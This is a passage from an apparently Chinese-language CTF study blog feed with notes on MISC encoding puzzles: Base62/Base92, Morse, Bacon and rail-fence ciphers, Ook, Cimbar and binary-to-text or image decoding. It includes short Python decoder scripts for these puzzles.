0);">注意：在某些需要某些输出的情况下，可能需要将〜用作空字符串分号：但是，传递空字符串进行解码不会导致它变成barf，因此不要求使用〜。</font></p><p><font style="color:rgb(0, 0, 0);">旁注：以前base92产生的输出的长度与输入的长度非单调增长。这已不再是这种情况。</font></p><p><font style="color:rgb(0, 0, 0);">另一个旁注：base64和base85更加优雅，将一个较小的字节整数干净地映射到另一个较小的字节整数。base92将13个字节映射为16个字符，从大小的角度来看，这比base85的4至5个字符更好，但是相当不雅观。</font><font style="color:rgb(0, 0, 0);">我们还遵循使用高除数乘积作为第一个字节的base85约定。”</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">以上是笔者用谷歌翻译直接搬运的，如有描述不懂的小伙伴，请参照原文链接进行参考~</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><h2 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a><strong><font style="color:rgb(0, 128, 128);">Base62</font></strong></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><ul><li><font style="color:rgb(0, 0, 0);">Base62编码将数字转换为ASCII字符串（0-9，az和AZ），反之亦然，这通常会导致字符串较短。</font></li></ul><p><font style="color:rgb(0, 0, 0);">               26个小写字母+26个大写字母+10个数字&#x3D;62</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><strong><font style="color:rgb(0, 0, 0);">（1）62进制与10进制的互相转化</font></strong></p><p><font style="color:rgb(0, 0, 0);"> </font></p><ul><li><font style="color:rgb(0, 0, 0);"> 62进制转10进制与2进制转10进制相似。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> 2进制转10进制过程为： 从右到左用二进制的每个数去乘以2的相应次方，次方要从0开始。</font></p><p><font style="color:rgb(0, 0, 0);"> 62进制转10进制也类似，从右往左每个数*62的N次方，N从0开始。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 那么，10进制转62进制也与10进制转2进制类似。  即：不断除以62取余数，然后倒序。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><strong><font style="color:rgb(0, 0, 0);">（2）关于短Url的转换</font></strong></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 主要思路，维护一个全局自增的id，每来一个长url，将其与一个自增id绑定，然后利用base62将该自增id转换为base62字符串，即完成转换。</font></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000510-4c2ce6fd-5fe5-4151-80c2-a7a41631a567-366234.png" alt="1715055000510-4c2ce6fd-5fe5-4151-80c2-a7a41631a567.png"></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 以上就是对Base系列编码的浅析，部分知识是笔者从wiki上搬运过来的，也参考了很多博客文章和资料。如有错误及不足之处，请大佬们多提建议~</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">参考资料：</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"><a href="https://en.wikipedia.org/wiki">https://en.wikipedia.org/wiki</a></font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"><a href="https://blog.csdn.net/n0nameforn0w/article/details/87124053">https://blog.csdn.net/n0nameforn0w/article/details/87124053</a></font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"><a href="https://thenoviceoof.com/blog/projects/base92/">https://thenoviceoof.com/blog/projects/base92/</a></font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"><a href="https://segmentfault.com/a/1190000010516708">https://segmentfault.com/a/1190000010516708</a></font></p><hr><p>base16、32、64、85（较大的base）</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>base64-&gt;base85（不断尝试大的base解密）</p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715054840619-03a3ac93-ffe3-4f18-9f20-a1e11db8fb0b-881697.png" alt="1715054840619-03a3ac93-ffe3-4f18-9f20-a1e11db8fb0b.png"></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055163395-c20f725e-8e91-40b0-9fd6-df57b37a1eec-043661.png" alt="1715055163395-c20f725e-8e91-40b0-9fd6-df57b37a1eec.png"></p><p>先进行htlm解密再进行base85解密</p><h1 id="莫斯密码（-和-构成）"><a href="#莫斯密码（-和-构成）" class="headerlink" title="莫斯密码（-和.构成）"></a>莫斯密码（-和.构成）</h1><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715256897011-7833ab5e-7fb5-4c4f-b942-d4a626b29944-162646.png" alt="1715256897011-7833ab5e-7fb5-4c4f-b942-d4a626b29944.png"></p><p>– ..- –.. .. -.- .. … –. —– —– -..</p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715257773833-5814f7c9-3c85-4efd-9b86-75849a6312bc-292602.png" alt="1715257773833-5814f7c9-3c85-4efd-9b86-75849a6312bc.png"></p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>分为标准型和W型</p><h1 id="培根密码（只由A、B构成）"><a href="#培根密码（只由A、B构成）" class="headerlink" title="培根密码（只由A、B构成）"></a><font style="color:#000000;">培根密码（只由A、B构成）</font></h1><p>只由A、B构成</p><p><font style="color:rgb(85, 85, 85);">1、培根密码（Bacon’s cipher），本质上是一种替换密码，根据对应转换规则进行加密解密，通过不明显的特征来隐藏明文信息；</font><br><font style="color:rgb(85, 85, 85);">2、培根密码加密规则，将明文中的每个字母，转换成一组五个英文字母，即可得到密文，转换规则表如下：</font><br><font style="color:rgb(85, 85, 85);">  a   AAAAA    g      AABBA     n     ABBAA     t       BAABA</font><br><font style="color:rgb(85, 85, 85);">  b   AAAAB    h      AABBB     o     ABBAB     u-v    BAABB</font><br><font style="color:rgb(85, 85, 85);">  c   AAABA    i-j     ABAAA     p     ABBBA     w      BABAA</font><br><font style="color:rgb(85, 85, 85);">  d   AAABB    k      ABAAB     q     ABBBB      x       BABAB</font><br><font style="color:rgb(85, 85, 85);">  e   AABAA    l       ABABA     r      BAAAA     y       BABBA</font><br><font style="color:rgb(85, 85, 85);">  f    AABAB    m     ABABB     s      BAAAB     z       BABBB</font><br><font style="color:rgb(85, 85, 85);">3、培根密码解密时，将密文进行5个字符分组，替换成对应的明文即可。</font><br><font style="color:rgb(85, 85, 85);">4、培根密码，通常有两种不同的转换规则，一种为即I与J、U与V使用相同的编码，一种为I与J、U与V都使用不同编码。</font></p><h1 id="html解密"><a href="#html解密" class="headerlink" title="html解密"></a><font style="color:rgb(85, 85, 85);">html解密</font></h1><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715054779960-15e6c1fb-ccab-41f1-b60d-f3214c01327b-785437.png" alt="1715054779960-15e6c1fb-ccab-41f1-b60d-f3214c01327b.png"></p><h1 id="md5解密"><a href="#md5解密" class="headerlink" title="md5解密"></a>md5解密</h1><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055871376-83142243-7109-452e-b929-fde75f128b7f-270275.png" alt="1715055871376-83142243-7109-452e-b929-fde75f128b7f.png"></p><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><h1 id="二维码解码器"><a href="#二维码解码器" class="headerlink" title="二维码解码器"></a>二维码解码器</h1><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715083471177-a09935e5-71b5-4097-8c40-55de8162053e-942696.png" alt="1715083471177-a09935e5-71b5-4097-8c40-55de8162053e.png"></p><p>把？后面的复制下来，进行base64解密</p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715083498475-ab2040b3-6036-4618-8a2e-a941448f889e-045850.png" alt="1715083498475-ab2040b3-6036-4618-8a2e-a941448f889e.png"></p><h1 id="兔子解密（rot5、13、18、47）"><a href="#兔子解密（rot5、13、18、47）" class="headerlink" title="兔子解密（rot5、13、18、47）"></a>兔子解密（rot5、13、18、47）</h1><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1717231475092-2ecf40b6-bd4e-4a72-af4f-001efe921c8a-316374.png" alt="1717231475092-2ecf40b6-bd4e-4a72-af4f-001efe921c8a.png"></p><h1 id="新佛曰"><a href="#新佛曰" class="headerlink" title="新佛曰"></a>新佛曰</h1><p><a href="http://hi.pcmoe.net/buddha.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTczNzU3NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5NzM3NTQ1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMxMTE0NzQxNX0.mTWIluoUq65XDAhk6XrX9TnWYTlf03r-E2CS43TFFdY">新约佛论禅&#x2F;佛曰加密 - 萌研社 - PcMoe!</a></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1727174685457-337375d6-e901-4a20-b4df-d26b987e4788-093205.png" alt="1727174685457-337375d6-e901-4a20-b4df-d26b987e4788.png"></p><blockquote><p>更新: 2024-09-24 18:45:39<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wd6us3twqkz64s9t">https://www.yuque.com/chaye-apqbl/vsc85q/wd6us3twqkz64s9t</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%BC%96%E7%A0%81/ook%E7%BC%96%E7%A0%81/"/>
    <url>/2026/01/19/MISC/%E7%BC%96%E7%A0%81/ook%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="ook编码"><a href="#ook编码" class="headerlink" title="ook编码"></a>ook编码</h1><p><a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding [splitbrain.org]</a></p><p>….. ….. ….! ?!!.? ….. ….. ….? .?!.? ….! .?… ….. …..</p><p>..!?! !.?.. ….. ….. ..?.? !.?.. ….. ….. ….. ….. !.?.. …..</p><p>….. .!?!! .?!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?… ….! ?!!.?</p><p>!!!!! !?.?! .?!!! !!!!! !!!!! .!!!. ?…. ….. ….. .!?!! .?… …..</p><p>….. .?.?! .?!.? .</p><p><img src="/./img/_jZAOlhyqSkN6VpF/1730350450413-b688bccb-cc64-49f5-9d7a-b065bcd8cb9c-251571.png" alt="1730350450413-b688bccb-cc64-49f5-9d7a-b065bcd8cb9c.png"></p><p><img src="/./img/_jZAOlhyqSkN6VpF/1730350469512-8c9170b4-c67b-4984-ba84-6f2fd8cfd284-121626.png" alt="1730350469512-8c9170b4-c67b-4984-ba84-6f2fd8cfd284.png"></p><blockquote><p>更新: 2024-10-31 12:54:31<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/xcd9pvw1k71teuc0">https://www.yuque.com/chaye-apqbl/vsc85q/xcd9pvw1k71teuc0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%BC%96%E7%A0%81/Cimbar/"/>
    <url>/2026/01/19/MISC/%E7%BC%96%E7%A0%81/Cimbar/</url>
    
    <content type="html"><![CDATA[<h1 id="Cimbar"><a href="#Cimbar" class="headerlink" title="Cimbar"></a>Cimbar</h1><p><a href="https://www.bilibili.com/opus/975102170591395840">https://www.bilibili.com/opus/975102170591395840</a></p><p><img src="/./img/khHzfA452rW5P-OV/1731741150326-719c8948-e5c5-4141-8d66-cdd523903c04-756629.webp" alt="1731741150326-719c8948-e5c5-4141-8d66-cdd523903c04.webp"></p><p><font style="color:rgb(24, 25, 28);">每个符号在哈希空间内与其他符号相隔至少 20 位，这确保了即使图像模糊或受到其他干扰时，也能清晰区分各个符号。</font></p><p> <img src="/./img/khHzfA452rW5P-OV/1731741173056-444a9205-9de5-4e3f-a2d2-74fa10ad1e06-132968.webp" alt="1731741173056-444a9205-9de5-4e3f-a2d2-74fa10ad1e06.webp"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="SYC"><a href="#SYC" class="headerlink" title="SYC"></a>SYC</h2><p>对着图片敲二进制就行</p><p><img src="/./img/khHzfA452rW5P-OV/1731741246905-615f38c7-dc35-4c36-9cc1-09740601b03f-868300.png" alt="1731741246905-615f38c7-dc35-4c36-9cc1-09740601b03f.png"></p><p>0101 0011 0101 1001 0100 0011 0111 1011</p><p>0100 0001 0110 1110 0011 0000 0111 0100</p><p>0110 1000 0011 0011 0111 0010 0101 1111</p><p>0100 0001 0110 1101 0100 0000 0111 1010</p><p>0011 0001 0110 1110 0011 1001 0101 1111</p><p>0101 0001 0101 0010 0101 1111 0100 0011</p><p>0110 1111 0011 0100 0110 0101 0111 1101</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 给定的二进制数据<br>binary_data = &quot;&quot;&quot;<br>01010011010110010100001101111011<br>01000001011011100011000001110100<br>01101000001100110111001001011111<br>01000001011011010100000001111010<br>00110001011011100011100101011111<br>01010001010100100101111101000011<br>01101111001101000110010101111101<br>&quot;&quot;&quot;<br><br># 将所有二进制数据合并为一个字符串<br>binary_data = binary_data.replace(&quot; &quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;)<br><br># 将每 8 位转换为一个字符<br>text = &quot;&quot;<br>for i in range(0, len(binary_data), 8):<br>    byte = binary_data[i:i+8]<br>    char = chr(int(byte, 2))  # 将 8 位二进制转换为整数，再转换为字符<br>    text += char<br><br># 输出结果<br>print(&quot;转换后的字符是：&quot;)<br>print(text)<br></code></pre></td></tr></table></figure><p><img src="/./img/khHzfA452rW5P-OV/1731741830974-a2ed3a0b-efcc-4f98-96c7-b746ff80d49e-644087.png" alt="1731741830974-a2ed3a0b-efcc-4f98-96c7-b746ff80d49e.png"></p><blockquote><p>更新: 2024-11-16 15:24:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/bsb876yfxnzcbuuk">https://www.yuque.com/chaye-apqbl/vsc85q/bsb876yfxnzcbuuk</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%BC%96%E7%A0%81/base2048/"/>
    <url>/2026/01/19/MISC/%E7%BC%96%E7%A0%81/base2048/</url>
    
    <content type="html"><![CDATA[<h1 id="base2048"><a href="#base2048" class="headerlink" title="base2048"></a>base2048</h1><p><img src="/./img/YtY7VVhMiilnZsCT/1729153577073-82ce4789-d66d-46e6-b481-7004e4b0f5b0-685540.png" alt="1729153577073-82ce4789-d66d-46e6-b481-7004e4b0f5b0.png"></p><blockquote><p>更新: 2024-10-17 16:26:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dh16kgx3z0xwrevl">https://www.yuque.com/chaye-apqbl/vsc85q/dh16kgx3z0xwrevl</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%BC%96%E7%A0%81/01%E7%BC%96%E7%A0%81/"/>
    <url>/2026/01/19/MISC/%E7%BC%96%E7%A0%81/01%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="01编码"><a href="#01编码" class="headerlink" title="01编码"></a>01编码</h1><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>转成字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">with <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-string">&quot;./1.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)</span>as f2r:<br>    contents = f2r.readlines()<br>    string1=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> content in contents:<br>        content = content.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>        print(content)<br>        <span class="hljs-keyword">if</span> len(content)==<span class="hljs-number">7</span>:<br>            string1+=content<br>        elif len(content)==<span class="hljs-number">6</span>:<br>            content=content+<span class="hljs-string">&quot;0&quot;</span><br>            string1+=content<br>        <br>print(string1)<br></code></pre></td></tr></table></figure><p>反转</p><p><img src="/./img/CR8p3e3wZogTmpi2/1755397831613-52cbc516-8a00-4009-992f-53d37620d15d-737615.png" alt="1755397831613-52cbc516-8a00-4009-992f-53d37620d15d.png"></p><p>格雷码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">decode_custom_gray</span><span class="hljs-params">(binary_chunks)</span>:<br>    &quot;&quot;&quot;<br>    将自定义格雷编码的二进制块解码为ASCII字符串<br><br>    参数:<br>        binary_chunks: 二进制字符串列表，每个字符串代表一个编码块<br><br>    返回:<br>        解码后的ASCII字符串<br>    &quot;&quot;&quot;<br>    # 定义格雷码到四进制的映射规则<br>    GRAY_TO_BASE4 = &#123;<br>        <span class="hljs-string">&#x27;00&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;01&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;11&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>        <span class="hljs-string">&#x27;10&#x27;</span>: <span class="hljs-string">&#x27;3&#x27;</span><br>    &#125;<br><br>    result = []<br><br>    <span class="hljs-keyword">for</span> chunk in binary_chunks:<br>        # 跳过非偶数长度的块<br>        <span class="hljs-keyword">if</span> len(chunk) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        try:<br>            # 将二进制块分割为<span class="hljs-number">2</span>位一组<br>            pairs = [chunk[i:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>, len(chunk), <span class="hljs-number">2</span>)]<br><br>            # 转换为四进制数字<br>            base4_digits = []<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">pair</span> in pairs:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">pair</span> in GRAY_TO_BASE4:<br>                    base4_digits.append(GRAY_TO_BASE4[<span class="hljs-built_in">pair</span>])<br>                <span class="hljs-keyword">else</span>:<br>                    raise ValueError(f<span class="hljs-string">&quot;无效的二进制对: &#123;pair&#125;&quot;</span>)<br><br>            # 将四进制转换为十进制<br>            decimal_value = <span class="hljs-type">int</span>(<span class="hljs-string">&#x27;&#x27;.join(base4_digits), 4)</span><br><span class="hljs-string"></span><br><span class="hljs-string">            # 只保留可打印ASCII字符(32-126)</span><br><span class="hljs-string">            if 32 &lt;= decimal_value &lt;= 126:</span><br><span class="hljs-string">                result.append(chr(decimal_value))</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                result.append(&#x27;</span>?<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">        except (ValueError, KeyError):</span><br><span class="hljs-string">            result.append(&#x27;</span>?<span class="hljs-string">&#x27;)  # 无效的二进制对</span><br><span class="hljs-string">        except Exception:</span><br><span class="hljs-string">            result.append(&#x27;</span>?<span class="hljs-string">&#x27;)  # 其他转换错误</span><br><span class="hljs-string"></span><br><span class="hljs-string">    return &#x27;</span><span class="hljs-string">&#x27;.join(result)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def main():</span><br><span class="hljs-string">    # 测试数据</span><br><span class="hljs-string">    binary_chunks = [</span><br><span class="hljs-string">        &#x27;</span><span class="hljs-number">01010110</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01110101</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01111000</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01110010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">100000</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01111001</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">100010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01011010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01010100</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">100000</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01011010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01111000</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">100010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01100111</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01110101</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">100001</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01011010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01100100</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01111100</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01100011</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">100010</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">01110101</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">110001</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">110001</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">110001</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">110001</span>&#x27;<br>    ]<br><br>    decoded = decode_custom_gray(binary_chunks)<br>    print(<span class="hljs-string">&quot;解码结果:&quot;</span>, decoded)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>转二维码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">from PIL import Image<br>MAX = <span class="hljs-number">600</span><br>#字符串长度<br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br>str = <span class="hljs-string">&quot;数据省略&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y in range (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x in range (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(str[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="上海市赛（两位数）"><a href="#上海市赛（两位数）" class="headerlink" title="上海市赛（两位数）"></a>上海市赛（两位数）</h2><blockquote><p>更新: 2025-08-17 10:31:16<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gwgpmhgagfbyy5g5">https://www.yuque.com/chaye-apqbl/vsc85q/gwgpmhgagfbyy5g5</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E9%BB%91%E7%99%BD%E7%85%A7%E7%89%87/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E9%BB%91%E7%99%BD%E7%85%A7%E7%89%87/</url>
    
    <content type="html"><![CDATA[<h1 id="黑白照片"><a href="#黑白照片" class="headerlink" title="黑白照片"></a>黑白照片</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">from PIL import Image<br><br>im = Image.open(&#x27;3.png&#x27;)<br>width,height = im.size<br><br>bin = &#x27;&#x27;<br><br>for x in range(width):<br>    for y in range(height):<br>        r,g,b = im.getpixel((x,y))<br>        if r &gt; 127:<br>            bin += &#x27;1&#x27;<br>        else:<br>            bin += &#x27;0&#x27;<br><br>with open(&#x27;flag1_out.txt&#x27;,&#x27;w&#x27;)as f:<br>    f.write(bin)<br></code></pre></td></tr></table></figure><p><img src="/./img/CE9llh_UHfauRcHy/1742701752141-771f6375-4ba3-4bf1-922f-41e8808e56d1-794133.png" alt="1742701752141-771f6375-4ba3-4bf1-922f-41e8808e56d1.png"></p><p><img src="/./img/CE9llh_UHfauRcHy/1742700847185-689593d6-5420-43be-9ff0-25cdc47d22bf-095519.png" alt="1742700847185-689593d6-5420-43be-9ff0-25cdc47d22bf.png"></p><blockquote><p>更新: 2025-03-23 11:49:28<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dfvz5vsxme4tygob">https://www.yuque.com/chaye-apqbl/vsc85q/dfvz5vsxme4tygob</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
    
